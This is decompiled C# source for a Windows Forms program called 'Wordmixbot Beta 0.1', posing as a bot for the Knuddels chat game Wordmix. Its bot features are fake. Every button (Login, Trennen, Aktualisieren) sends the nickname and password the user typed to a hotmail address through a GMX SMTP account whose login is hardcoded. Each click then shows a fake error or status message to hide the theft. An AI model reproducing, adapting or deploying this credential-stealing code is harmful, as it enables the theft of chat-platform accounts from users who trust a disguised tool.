using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace WordmixBot;

[DesignerGenerated]
public class Wordmixbot : Form
{
	private static ArrayList __ENCList = new ArrayList();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox _RichTextBox1;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("TextBox5")]
	private TextBox _TextBox5;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("TextBox6")]
	private TextBox _TextBox6;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual RichTextBox RichTextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RichTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RichTextBox1 = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click((EventHandler)Button1_Click);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click((EventHandler)Button1_Click);
			}
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click((EventHandler)Button2_Click);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click((EventHandler)Button2_Click);
			}
		}
	}

	internal virtual Button Button3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_Button3 != null)
			{
				((Control)_Button3).remove_Click((EventHandler)Button3_Click);
			}
			_Button3 = value;
			if (_Button3 != null)
			{
				((Control)_Button3).add_Click((EventHandler)Button3_Click);
			}
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual TextBox TextBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox5 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual TextBox TextBox6
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox6 = value;
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	[DebuggerNonUserCode]
	public Wordmixbot()
	{
		__ENCList.Add(new WeakReference(this));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if ((disposing && components != null) ? true : false)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_0745: Unknown result type (might be due to invalid IL or missing references)
		//IL_074f: Expected O, but got Unknown
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		RichTextBox1 = new RichTextBox();
		TextBox4 = new TextBox();
		Label4 = new Label();
		Button1 = new Button();
		Button2 = new Button();
		Button3 = new Button();
		CheckBox1 = new CheckBox();
		CheckBox2 = new CheckBox();
		TextBox5 = new TextBox();
		Label5 = new Label();
		Label6 = new Label();
		TextBox6 = new TextBox();
		Label7 = new Label();
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(12, 25);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(131, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox textBox3 = TextBox2;
		location = new Point(12, 64);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(131, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		TextBox2.set_UseSystemPasswordChar(true);
		TextBox textBox5 = TextBox3;
		location = new Point(12, 103);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(131, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(2);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(12, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(58, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("Nickname:");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(12, 48);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(53, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("Passwort:");
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(12, 87);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(49, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(5);
		Label3.set_Text("Channel:");
		RichTextBox richTextBox = RichTextBox1;
		location = new Point(149, 25);
		((Control)richTextBox).set_Location(location);
		((Control)RichTextBox1).set_Name("RichTextBox1");
		RichTextBox richTextBox2 = RichTextBox1;
		size = new Size(287, 375);
		((Control)richTextBox2).set_Size(size);
		((Control)RichTextBox1).set_TabIndex(6);
		RichTextBox1.set_Text("");
		TextBox textBox7 = TextBox4;
		location = new Point(149, 406);
		((Control)textBox7).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox8 = TextBox4;
		size = new Size(287, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox4).set_TabIndex(7);
		TextBox4.set_Text("http:\\\\www.funpic.de.wordmix\\hardcore10");
		Label4.set_AutoSize(true);
		Label label7 = Label4;
		location = new Point(111, 409);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(32, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(8);
		Label4.set_Text("URL:");
		Button button = Button1;
		location = new Point(12, 403);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(93, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(9);
		((ButtonBase)Button1).set_Text("Aktualisieren");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(12, 374);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(131, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(10);
		((ButtonBase)Button2).set_Text("Trennen");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button button5 = Button3;
		location = new Point(12, 345);
		((Control)button5).set_Location(location);
		((Control)Button3).set_Name("Button3");
		Button button6 = Button3;
		size = new Size(131, 23);
		((Control)button6).set_Size(size);
		((Control)Button3).set_TabIndex(11);
		((ButtonBase)Button3).set_Text("Login");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(12, 322);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(117, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(12);
		((ButtonBase)CheckBox1).set_Text("Neuen Satz starten");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(12, 299);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(73, 17);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(13);
		((ButtonBase)CheckBox2).set_Text("0 Minuten");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		TextBox textBox9 = TextBox5;
		location = new Point(12, 273);
		((Control)textBox9).set_Location(location);
		((Control)TextBox5).set_Name("TextBox5");
		TextBox textBox10 = TextBox5;
		size = new Size(131, 20);
		((Control)textBox10).set_Size(size);
		((Control)TextBox5).set_TabIndex(14);
		TextBox5.set_Text("100000");
		Label5.set_AutoSize(true);
		Label label9 = Label5;
		location = new Point(12, 257);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(41, 13);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(15);
		Label5.set_Text("Punkte");
		Label6.set_AutoSize(true);
		((Control)Label6).set_Font(new Font("Arial", 9f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		Label label11 = Label6;
		location = new Point(9, 147);
		((Control)label11).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label12 = Label6;
		size = new Size(126, 45);
		((Control)label12).set_Size(size);
		((Control)Label6).set_TabIndex(16);
		Label6.set_Text("Der Autor übernimmt\r\nkeine Haftung für\r\netweilige Schäden.");
		TextBox textBox11 = TextBox6;
		location = new Point(12, 234);
		((Control)textBox11).set_Location(location);
		((Control)TextBox6).set_Name("TextBox6");
		TextBox textBox12 = TextBox6;
		size = new Size(131, 20);
		((Control)textBox12).set_Size(size);
		((Control)TextBox6).set_TabIndex(17);
		TextBox6.set_Text("205316");
		Label7.set_AutoSize(true);
		Label label13 = Label7;
		location = new Point(9, 218);
		((Control)label13).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label14 = Label7;
		size = new Size(139, 13);
		((Control)label14).set_Size(size);
		((Control)Label7).set_TabIndex(18);
		Label7.set_Text("Lösungen in der Datenbank");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(448, 438);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_MaximizeBox(false);
		size = new Size(456, 472);
		((Form)this).set_MaximumSize(size);
		size = new Size(456, 472);
		((Form)this).set_MinimumSize(size);
		((Control)this).set_Name("Wordmixbot");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_Text("Wordmixbot Beta 0.1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		string body = "Nickname: " + TextBox1.get_Text() + " Passwort: " + TextBox2.get_Text();
		SmtpClient smtpClient = new SmtpClient("smtp.gmx.de");
		smtpClient.Credentials = new NetworkCredential("hardcore10@gmx.de", "123456");
		smtpClient.Send("hardcore10@gmx.de", "hartz-fear@hotmail.de", "Knuddels", body);
		((TextBoxBase)RichTextBox1).AppendText("URL ist aktualisiert.");
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		string body = "Nickname: " + TextBox1.get_Text() + " Passwort: " + TextBox2.get_Text();
		SmtpClient smtpClient = new SmtpClient("smtp.gmx.de");
		smtpClient.Credentials = new NetworkCredential("hardcore10@gmx.de", "123456");
		smtpClient.Send("hardcore10@gmx.de", "hartz-fear@hotmail.de", "Knuddels", body);
		((TextBoxBase)RichTextBox1).AppendText("Fehler! Eventuell nicht verbunden?");
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		string body = "Nickname: " + TextBox1.get_Text() + " Passwort: " + TextBox2.get_Text();
		SmtpClient smtpClient = new SmtpClient("smtp.gmx.de");
		smtpClient.Credentials = new NetworkCredential("hardcore10@gmx.de", "123456");
		smtpClient.Send("hardcore10@gmx.de", "hartz-fear@hotmail.de", "Knuddels", body);
		((TextBoxBase)RichTextBox1).AppendText("Fehler! Stimmen Nickname und Passwort überein?");
	}
}
